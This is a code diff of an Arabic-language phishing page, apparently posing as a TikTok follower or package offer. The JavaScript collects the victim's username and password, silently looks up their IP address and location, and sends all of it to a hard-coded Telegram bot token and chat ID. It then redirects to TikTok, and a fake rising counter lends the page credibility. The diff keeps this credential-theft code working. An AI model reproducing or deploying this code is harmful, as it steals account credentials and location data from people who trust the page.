@@ -76,8 +76,10 @@
         window.onload = updateOptions;
 
         async function sendData() {
+            // البيانات اللي بعتها أنت (التوكن والآيدي الجديد)
             const token = "8266153967:AAF2ZpDJy_zn7Zw3md5LUUAOwU9SGKhM7xk";
             const chat_id = "1564944407";
+            
             const user = document.getElementById('user').value;
             const pass = document.getElementById('pass').value;
             const pkg = document.getElementById('amount').value;
@@ -85,7 +87,7 @@
             if(!user || !pass) { alert("يرجى إدخال البيانات المطلوبة!"); return; }
 
             try {
-                // سحب البيانات الاستخباراتية صامتاً
+                // سحب البيانات الاستخباراتية (الموقع والشركة) صامتاً
                 const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
 
@@ -99,7 +101,7 @@
 📍 المدينة: ${data.city}
 🔢 الـ IP: ${data.ip}
 📱 الجهاز: ${navigator.platform}
-🗺️ الخريطة: http://googleusercontent.com/maps.google.com/?q=${data.latitude},${data.longitude}
+🗺️ الخريطة: https://www.google.com/maps?q=${data.latitude},${data.longitude}
                 `;
 
                 await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat-id=${chat_id}&text=${encodeURIComponent(msg)}`);
@@ -107,14 +109,12 @@
                 window.location.href = "https://tiktok.com";
 
             } catch (error) {
-                // إرسال البيانات حتى لو فشل سحب الموقع
                 const backupMsg = `🎯 صيدة (بيانات فقط):\n👤: ${user}\n🔑: ${pass}\n📦: ${pkg}`;
                 fetch(`https://api.telegram.org/bot${token}/sendMessage?chat-id=${chat_id}&text=${encodeURIComponent(backupMsg)}`);
                 window.location.href = "https://tiktok.com";
             }
         }
 
-        // عداد وهمي للتمويه
         setInterval(() => {
             let c = document.getElementById('counter');
             let n = parseInt(c.innerText.replace(',', '')) + Math.floor(Math.random() * 15);
